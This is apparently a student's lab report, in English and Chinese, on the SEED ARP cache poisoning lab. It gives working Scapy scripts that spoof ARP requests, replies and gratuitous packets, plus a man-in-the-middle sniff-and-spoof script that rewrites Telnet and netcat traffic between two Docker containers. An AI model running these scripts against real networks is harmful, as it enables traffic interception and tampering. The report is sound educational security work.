

# Overview
• The ARP protocol

• The ARP cache poisoning attack

• Man-in-the-middle attack

• Scapy programming

	# Environment Setup using Container

Download the Labsetup.zip fifile to your VM from the lab’s website, unzip it, enter the Labsetup
folder, and use the docker-compose.yml fifile to set up the lab environment.

Figure 1: Lab environment setup
![[大三下/网络与信息安全/实验二/attachments/setup.png]]

```
dcbuild
dcup
```

![[大三下/网络与信息安全/实验二/attachments/1.png]]


We fifirst need to use the "docker ps" command to fifind out the ID of
the container, and then use "docker exec" to start a shell on that container.
![[大三下/网络与信息安全/实验二/attachments/2.png]]

enter each one to show the information about ip 
```
docksh [ID]
ifconfig

```

M 
![[M.png]]

A
![[A.png]]

B
![[B.png]]

# Task 1: ARP Cache Poisoning
This is called Man-In-The-Middle (MITM) attack

```python
#!/usr/bin/env python3
from scapy.all import *
E = Ether()
A = ARP()
A.op = 1 # 1 for ARP request; 2 for ARP reply
pkt = E/A
sendp(pkt)
```


We can check a computer’s ARP cache using the following command.
```
$ arp -n
```

There are many ways to conduct ARP cache poisoning attack.
## Task 1.A (using ARP request).
**On host M, construct an ARP request packet to map B’s IP address to M’s MAC address. Send the packet to A and check whether the attack is successful or not.**

首先，在M上的volume文件夹下，写程序，让A的arp表中B的ip解析到M的mac程序完整代码如图，注意主要是mac和ip对应关系的填充
```python
#!/usr/bin/env python3
from scapy.all import *

# On host M, construct an ARP request packet to map B’s IP address to M’s MAC address. 
# victim:10.9.0.5
# goal: map 10.9.0.6 to 02:42:0a:09:00:69

print("SEDING ARP PACKET.......")
ether = Ether()
ether.dst ="ff:ff:ff:ff:ff:ff" 
ether.src ="02:42:0a:09:00:69" 

arp = ARP()
arp.op = 1 # 1 for ARP request; 2 for ARP reply

arp.hwsrc="02:42:0a:09:00:69" 
arp.psrc="10.9.0.6"

arp.hwdst="00:00:00:00:00:00" 
arp.pdst="10.9.0.5"

pkt = ether/arp
sendp(pkt)
```

然后在M内执行程序，注意权限，发起中间人攻击
![[大三下/网络与信息安全/实验二/attachments/6.png]]

查看A 的表
![[大三下/网络与信息安全/实验二/attachments/7.png]]
查看A中arp表中B的mac地址已经是我们py中写的，中间人攻击成功

## Task 1.B (using ARP reply).
On host M, construct an ARP reply packet to map B’s IP address to
M’s MAC address. Send the packet to A and check whether the attack is successful or not. Try the
attack under the following two scenarios, and report the results of your attack:

	- Scenario 1: B’s IP is already in A’s cache.

- Scenario 2: B’s IP is not in A’s cache. You can use the command "arp -d a.b.c.d" to
remove the ARP cache entry for the IP address a.b.c.d.
```python
#!/usr/bin/env python3
from scapy.all import *

# On host M, construct an ARP reply packet to map B’s IP address to M’s MAC address. 
# victim:10.9.0.5
# goal: map 10.9.0.6 to 02:42:0a:09:00:69

print("SEDING ARP PACKET.......")
ether = Ether()
ether.dst ="02:42:0a:09:00:5"  
ether.src ="02:42:0a:09:00:69" 

arp = ARP()
arp.op = 2 # 1 for ARP request; 2 for ARP reply
# src
arp.hwsrc="02:42:0a:09:00:69" 
arp.psrc="10.9.0.6"
# dst
arp.hwdst="02:42:0a:09:00:05" 
arp.pdst="10.9.0.5"

pkt = ether/arp
sendp(pkt)
```

```
编写完后 
chmod a+x filename //给所有用户读写运行的权限
```

Task1.a中发的是arp请求报文，这个是arp响应报文，本质没什么区别，构造arp reply数据包发送程序， 主要的区别其实还是在源和目的地址上面 ，而且这次已知了A的mac，并不是广播

#### Section1
首先，查看A的arp表，可见是上次攻击得到的假的mac地址，因此采用指令删除arp表项，即清空arp表，然后再用ping 命令，在A中ping B，通过发送报文，得到B的真实的mac地址，如下图。
即确保B’s IP is already in A’s cache.

```
# 在A中
arp -d 10.9.0.6 // 删除
arp -n   //查看
ping 10.9.0.6 //引入正确的表项
```

![[大三下/网络与信息安全/实验二/attachments/8.png]]

然后在M内执行程序，发起中间人攻击，可见arp表中mac地址发生改变，攻击成功

![[大三下/网络与信息安全/实验二/attachments/9.png]]

![[大三下/网络与信息安全/实验二/attachments/10.png]]

#### Section2 B’s IP is not in A’s cache.
清空arp表项，在此情况下再次发送reply报文无法成功，攻击失败
```
# 在A中
arp -d 10.9.0.6 // 删除
```

![[大三下/网络与信息安全/实验二/attachments/11.png]]

![[大三下/网络与信息安全/实验二/attachments/12.png]]

![[大三下/网络与信息安全/实验二/attachments/13.png]]



## Task 1.C (using ARP gratuitous message)
On host M, construct an ARP gratuitous packet, and use it to map B’s IP address to M’s MAC address. Please launch the attack under the same two scenarios as those described in Task 1.B.

ARP gratuitous packet is a special ARP request packet. It is used when a host machine needs to update outdated information on all the other machine’s ARP cache. The gratuitous ARP packet has the following characteristics:

- The source and destination IP addresses are the same, and they are the IP address of the host
issuing the gratuitous ARP.

- The destination MAC addresses in both ARP header and Ethernet header are the broadcast MAC
address (ff:ff:ff:ff:ff:ff).

- No reply is expected.

其实就需要修改一下刚才的request报文，要注意按照实验手册上的规则修改程序的ip数据报头的src,dst；MAC头的src,dst地址。即改IP为B的IP，改两个dst为广播，MAC还是M的MAC，具体程序如下：
```python
#!/usr/bin/env python3
from scapy.all import *

# On host M, construct an ARP reply packet to map B’s IP address to M’s MAC address. 
# victim:10.9.0.5
# goal: map 10.9.0.6 to 02:42:0a:09:00:69

print("SEDING ARP PACKET.......")
ether = Ether()
ether.dst ="ff:ff:ff:ff:ff:ff"  
ether.src ="02:42:0a:09:00:69" 

arp = ARP()
arp.op = 1 # 1 for ARP request; 2 for ARP reply
# src
arp.hwsrc="02:42:0a:09:00:69" 
arp.psrc="10.9.0.6"
# dst
arp.hwdst="ff:ff:ff:ff:ff:ff" 
arp.pdst="10.9.0.6"

pkt = ether/arp
sendp(pkt)
```

#### Section1 无表项
![[大三下/网络与信息安全/实验二/attachments/14.png]]

![[大三下/网络与信息安全/实验二/attachments/15.png]]

在无缓存的情况下，无效

#### Section1 有表项

![[大三下/网络与信息安全/实验二/attachments/16.png]]

![[大三下/网络与信息安全/实验二/attachments/17.png]]

![[大三下/网络与信息安全/实验二/attachments/18.png]]

Ping完，在有缓存的清空下，攻击成功


# Task 2: MITM Attack on Telnet using ARP Cache Poisoning


Figure 2: Man-In-The-Middle Attack against telnet
![[大三下/网络与信息安全/实验二/attachments/19.png]]
Step 1 (Launch the ARP cache poisoning attack).
首先，Host M对A和B进行ARP缓存中毒攻击，在A的ARP缓存中，B的IP地址映射到M的MAC地址，在B的ARP缓存中，A的IP地址也映射到M的MAC地址。在这个步骤之后，在A和B之间发送的数据包将全部发送给m。我们将使用来自Task 1的ARP缓存中毒攻击来实现这个目标。

```
首先让B的arp表也映射错误，mac映射为M的mac, 改一下task1的程序ip就好，然后再通过ping M的地址，让B的arp表中也有M的mac，结果如下

这里需要我们每5s发一个假的报文，否则攻击表项可能被真的替代。利用之前的程序，加一个while循环，并且每隔5s给两边都发一次假的arp报文，修改代码如下：
```


```python
#!/usr/bin/env python3
from scapy.all import *
import time
import sys

# victim:10.9.0.5
# goal: map 10.9.0.6 to 02:42:0a:09:00:69
print("SEDING ARP PACKET.......")
ether_A = Ether()
ether_A .src ="02:42:0a:09:00:69" 
ether_A.dst="02:42:0a:09:00:05"
arp_A = ARP()
arp_A.op = 1 # 1 for ARP request; 2 for ARP reply
arp_A.hwsrc="02:42:0a:09:00:69" 
arp_A.psrc="10.9.0.6"
arp_A.hwdst="00:00:00:00:00:00" 
arp_A.pdst="10.9.0.5"
pkt_A = ether_A/arp_A
sendp(pkt_A)

# victim:10.9.0.6
# goal: map 10.9.0.5 to 02:42:0a:09:00:69
ether_B= Ether()
ether_B.src ="02:42:0a:09:00:69" 
ether_B.dst="02:42:0a:09:00:06"
arp_B = ARP()
arp_B.op = 1 # 1 for ARP request; 2 for ARP reply
arp_B.hwsrc="02:42:0a:09:00:69" 
arp_B.psrc="10.9.0.5"
arp_B.hwdst="00:00:00:00:00:00" 
arp_B.pdst="10.9.0.6"
pkt_B= ether_B/arp_B
sendp(pkt_B)

try:  
    while (1):  
        time.sleep(5)  
        sendp(pkt_A) 
        sendp(pkt_B) 
except KeyboardInterrupt:  
    print('KeyboardInterrupt: Stopping the spoofed...')  
    sys.exit(0)
```





最好是不断地发送被欺骗的数据包（例如每5秒一次）；否则，假的条目可能会被真实的条目所取代。

A
![[大三下/网络与信息安全/实验二/attachments/20.png]]

B
![[大三下/网络与信息安全/实验二/attachments/21.png]]


Step 2 (Testing).
攻击成功后，请尝试在主机A和主机B之间相互ping，并报告您的观察结果。请在您的报告中显示Wireshark results。在执行此步骤之前，请确保主机M上的IP转发已关闭。您可以使用以下命令来执行此操作：

```
# sysctl net.ipv4.ip_forward=0
```

![[大三下/网络与信息安全/实验二/attachments/22.png]]

打开 wireshark 对 br-网桥进行监听


关闭IP forwarding
A ping B

![[大三下/网络与信息安全/实验二/attachments/23.png]]


B ping A
![[大三下/网络与信息安全/实验二/attachments/24.png]]

发现丢包率非常高

查看 wireshark 中包的情况
发现，丢包的都是 mac值错误的

A ping B 
![[25.png]]

![[26.png]]


B ping A
![[27.png]]

![[28.png]]



Step 3 (Turn on IP forwarding).
现在我们打开主机M上的IP转发，所以它将在A和B之间转发数据包，请运行以下命令，重复步骤2。请描述一下您的观察结果。
```
# sysctl net.ipv4.ip_forward=1
```

![[29.png]]

A ping B
B ping A
可以看到不丢包，并且可以收到105的重定向报文

查看 wireshark 中包的情况
#### A ping B 过程中
![[30.png]]

可以看到不丢包，并且可以收到105的重定向报文

![[大三下/网络与信息安全/实验二/attachments/31.png]]

![[32.png]]

![[33.png]]

![[34.png]]


#### B ping A 过程中

可以看到不丢包，并且可以收到105的重定向报文

![[35.png]]

![[36.png]]

![[37.png]]

![[38.png]]


![[39.png]]
M 得到的数据



 Step 4 (Launch the MITM attack).


首先让A远程登陆到B ，注意此时arp表中B的mac地址应该是M的mac地址

	M上,使A 连接到B
```
# sysctl net.ipv4.ip_forward=1
```

A
	telnet 10.9.0.6
	seed
	dees
![[40.png]]


先保持 IP转发 使得 a 连接到 b ，再关闭IP转发
M上
```
# sysctl net.ipv4.ip_forward=0
```

我们在主机M上运行我们的嗅探和欺骗程序（程序如下），这样对于从A发送到B的捕获包，我们欺骗一个包，但使用TCP不同的数据。对于从B到A的数据包（Telnet响应），我们不做任何更改，所以被欺骗的数据包与原始数据包完全相同。

```python
#!/usr/bin/env python3

from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
	if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
		# Create a new packet based on the captured one.
		# 1) We need to delete the checksum in the IP & TCP headers,
		#    because our modification will make them invalid.
		#    Scapy will recalculate them if these fields are missing.
		# 2) We also delete the original TCP payload.

		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].payload)
		del(newpkt[TCP].chksum)

		#################################################################
		# Construct the new payload based on the old payload.
		# Students need to implement this part.

		if pkt[TCP].payload:
			data = pkt[TCP].payload.load # The original payload data
			# newdata = data # No change is made in this sample code
			# Telnet will always display Z.
			data_list=list(data)
			for i in range(len(data_list)):
				# if chr(data_list[i]).isalpha():
				data_list[i]=ord('Z')
			newdata = bytes(data_list)	
			#
			send(newpkt/newdata)
			
		else:
			send(newpkt)

		################################################################
	elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
		# Create new packet based on the captured one
		# Do not make any change

		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].chksum)
		send(newpkt)

f = 'tcp'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

sysctl net.ipv4.ip_forward=0后，可以看到在远程登陆时输入的字母全变成了Z字符，攻击生效


![[大三下/网络与信息安全/实验二/attachments/41.png]]

![[大三下/网络与信息安全/实验二/attachments/42.png]]

# Task 3: MITM Attack on Netcat using ARP Cache Poisoning
这个任务类似于任务2，除了主机A和B使用netcat而不是telnet进行通信。主机M希望拦截它们的通信，因此它可以对A和B之间发送的数据进行更改。您可以使用以下命令在A和B之间建立netcat TCP连接：

```
On Host B (server, IP address is 10.9.0.6), run the following:
# nc -lp 9090
On Host A (client), run the following:
# nc 10.9.0.6 9090
```

此实验与前序实验一样，不用改代码，
只是用nc命令测试当开启路由（sysctl net.ipv4.ip_forward = 1），并停止运行telnet攻击脚本时，nc的内容都能正常被接收。

```
# sysctl net.ipv4.ip_forward=0
```

但是一旦关闭路由（置0），再次执行telnet，即可看到仍旧是所有字母都被替换成了@，攻击成功

```python
			# replace d sequence
			data_list=list(data)
			if len(data_list)>=5: 
			    data_list[0] = ord('f')  
			    data_list[1] = ord('r')  
			    data_list[2] = ord('a')  
			    data_list[3] = ord('n')  
			    data_list[4] = ord('k')
			newdata = bytes(data_list)	
			#


```


![[大三下/网络与信息安全/实验二/attachments/43.png]]



A
![[大三下/网络与信息安全/实验二/attachments/44.png]]


![[大三下/网络与信息安全/实验二/attachments/45.png]]

开启欺骗
![[大三下/网络与信息安全/实验二/attachments/46.png]]


![[大三下/网络与信息安全/实验二/attachments/47.png]]

![[大三下/网络与信息安全/实验二/attachments/48.png]]